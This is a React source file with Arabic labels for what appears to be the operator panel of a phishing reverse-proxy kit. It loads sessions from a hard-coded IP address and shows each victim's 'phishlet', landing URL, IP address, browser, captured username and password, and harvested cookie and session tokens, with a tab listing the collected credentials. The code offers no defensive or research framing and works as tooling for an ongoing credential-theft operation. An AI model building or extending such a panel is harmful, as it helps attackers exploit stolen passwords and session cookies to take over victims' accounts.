import React, { useState, useEffect } from 'react';
import { useParams, Link } from 'react-router-dom';
import axios from 'axios';
import {
  Box,
  Typography,
  Paper,
  Grid,
  Divider,
  Chip,
  List,
  ListItem,
  ListItemText,
  TableContainer,
  Table,
  TableHead,
  TableBody,
  TableRow,
  TableCell,
  CircularProgress,
  Alert,
  Button,
  Tabs,
  Tab,
  Accordion,
  AccordionSummary,
  AccordionDetails
} from '@mui/material';
import ArrowBackIcon from '@mui/icons-material/ArrowBack';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
import moment from 'moment';

// Component to display session details and logs
const SessionDetail = () => {
  const { id } = useParams();
  const [session, setSession] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [currentTab, setCurrentTab] = useState(0);

  useEffect(() => {
    const fetchSessionData = async () => {
      try {
        setLoading(true);
        // Fetch session details
        const sessionRes = await axios.get(`http://5.199.168.182:5000/api/sessions/${id}`);
        setSession(sessionRes.data.data);

        // Fetch session logs
        const logsRes = await axios.get(`http://5.199.168.182:5000/api/logs/session/${sessionRes.data.data.session_id}`);
        setLogs(logsRes.data.data);
        
        setLoading(false);
      } catch (err) {
        setError(err.response?.data?.message || `خطأ في جلب بيانات الجلسة رقم ${id}`);
        setLoading(false);
      }
    };

    fetchSessionData();
  }, [id]);

  const handleTabChange = (event, newValue) => {
    setCurrentTab(newValue);
  };

  const formatTimestamp = (timestamp) => {
    return moment(timestamp * 1000).format('YYYY-MM-DD HH:mm:ss');
  };

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', py: 5 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error || !session) {
    return (
      <Box>
        <Button 
          component={Link} 
          to="/sessions" 
          startIcon={<ArrowBackIcon />}
          sx={{ mb: 3 }}
        >
          العودة إلى الجلسات
        </Button>
        <Alert severity="error">
          {error || 'لم يتم العثور على الجلسة'}
        </Alert>
      </Box>
    );
  }

  return (
    <Box>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Button 
          component={Link} 
          to="/sessions" 
          startIcon={<ArrowBackIcon />}
        >
          العودة إلى الجلسات
        </Button>
        <Typography variant="h4" component="h1">
          تفاصيل الجلسة #{id}
        </Typography>
      </Box>

      <Tabs value={currentTab} onChange={handleTabChange} sx={{ mb: 3 }}>
        <Tab label="المعلومات الأساسية" />
        <Tab label="السجلات" />
        <Tab label="بيانات الاعتماد" />
      </Tabs>

      {/* Basic Session Info */}
      {currentTab === 0 && (
        <Paper sx={{ p: 3, mb: 3 }} elevation={2}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Typography variant="h6" gutterBottom>
                معلومات الجلسة
              </Typography>
              <List>
                <ListItem divider>
                  <ListItemText 
                    primary="النطاق" 
                    secondary={session.phishlet} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem divider>
                  <ListItemText 
                    primary="تاريخ الإنشاء" 
                    secondary={formatTimestamp(session.create_time)} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem divider>
                  <ListItemText 
                    primary="آخر تحديث" 
                    secondary={formatTimestamp(session.update_time)} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem divider>
                  <ListItemText 
                    primary="عنوان URL المستهدف" 
                    secondary={session.landing_url} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem divider>
                  <ListItemText 
                    primary="معرف الجلسة" 
                    secondary={session.session_id} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem>
                  <ListItemText 
                    primary="عنوان IP" 
                    secondary={session.remote_addr} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
              </List>
            </Grid>

            <Grid item xs={12} md={6}>
              <Typography variant="h6" gutterBottom>
                بيانات المستخدم
              </Typography>
              <List>
                <ListItem divider>
                  <ListItemText 
                    primary="اسم المستخدم" 
                    secondary={session.username || 'غير متوفر'} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem divider>
                  <ListItemText 
                    primary="كلمة المرور" 
                    secondary={session.password || 'غير متوفر'} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
                <ListItem>
                  <ListItemText 
                    primary="متصفح المستخدم" 
                    secondary={session.useragent} 
                    primaryTypographyProps={{ fontWeight: 'bold' }}
                  />
                </ListItem>
              </List>

              <Typography variant="h6" gutterBottom sx={{ mt: 3 }}>
                التوكنات
              </Typography>
              <Accordion>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography>توكنات الكوكيز</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  {session.cookies && Object.keys(session.cookies).length > 0 ? (
                    <TableContainer>
                      <Table size="small">
                        <TableHead>
                          <TableRow>
                            <TableCell>الاسم</TableCell>
                            <TableCell>القيمة</TableCell>
                          </TableRow>
                        </TableHead>
                        <TableBody>
                          {Object.entries(session.cookies).map(([key, value]) => (
                            <TableRow key={key}>
                              <TableCell>{key}</TableCell>
                              <TableCell sx={{ wordBreak: 'break-all' }}>{value}</TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                  ) : (
                    <Typography variant="body2" color="text.secondary">لا توجد توكنات كوكيز</Typography>
                  )}
                </AccordionDetails>
              </Accordion>

              <Accordion>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography>توكنات الجلسة</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  {session.tokens && Object.keys(session.tokens).length > 0 ? (
                    <TableContainer>
                      <Table size="small">
                        <TableHead>
                          <TableRow>
                            <TableCell>الاسم</TableCell>
                            <TableCell>القيمة</TableCell>
                          </TableRow>
                        </TableHead>
                        <TableBody>
                          {Object.entries(session.tokens).map(([key, value]) => (
                            <TableRow key={key}>
                              <TableCell>{key}</TableCell>
                              <TableCell sx={{ wordBreak: 'break-all' }}>{value}</TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                  ) : (
                    <Typography variant="body2" color="text.secondary">لا توجد توكنات جلسة</Typography>
                  )}
                </AccordionDetails>
              </Accordion>
            </Grid>
          </Grid>
        </Paper>
      )}

      {/* Logs */}
      {currentTab === 1 && (
        <Paper sx={{ p: 3 }} elevation={2}>
          <Typography variant="h6" gutterBottom>
            سجلات الجلسة
          </Typography>
          {logs.length > 0 ? (
            <TableContainer>
              <Table>
                <TableHead>
                  <TableRow>
                    <TableCell>التاريخ والوقت</TableCell>
                    <TableCell>المستوى</TableCell>
                    <TableCell>الرسالة</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {logs.map((log, index) => (
                    <TableRow key={index}>
                      <TableCell>{log.timestamp}</TableCell>
                      <TableCell>
                        <Chip 
                          label={log.level} 
                          size="small"
                          color={
                            log.level === 'error' ? 'error' :
                            log.level === 'warning' ? 'warning' :
                            log.level === 'success' ? 'success' : 'default'
                          }
                        />
                      </TableCell>
                      <TableCell>{log.message}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          ) : (
            <Alert severity="info">لا توجد سجلات لهذه الجلسة</Alert>
          )}
        </Paper>
      )}

      {/* Credentials */}
      {currentTab === 2 && (
        <Paper sx={{ p: 3 }} elevation={2}>
          <Typography variant="h6" gutterBottom>
            بيانات الاعتماد
          </Typography>
          {session.username || session.password ? (
            <Grid container spacing={3}>
              <Grid item xs={12} md={6}>
                <TableContainer>
                  <Table>
                    <TableHead>
                      <TableRow>
                        <TableCell>النوع</TableCell>
                        <TableCell>القيمة</TableCell>
                        <TableCell>تاريخ التجميع</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {session.username && (
                        <TableRow>
                          <TableCell>اسم المستخدم</TableCell>
                          <TableCell>{session.username}</TableCell>
                          <TableCell>{formatTimestamp(session.update_time)}</TableCell>
                        </TableRow>
                      )}
                      {session.password && (
                        <TableRow>
                          <TableCell>كلمة المرور</TableCell>
                          <TableCell>{session.password}</TableCell>
                          <TableCell>{formatTimestamp(session.update_time)}</TableCell>
                        </TableRow>
                      )}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Grid>
            </Grid>
          ) : (
            <Alert severity="info">لم يتم جمع بيانات اعتماد لهذه الجلسة بعد</Alert>
          )}
        </Paper>
      )}
    </Box>
  );
};

export default SessionDetail; 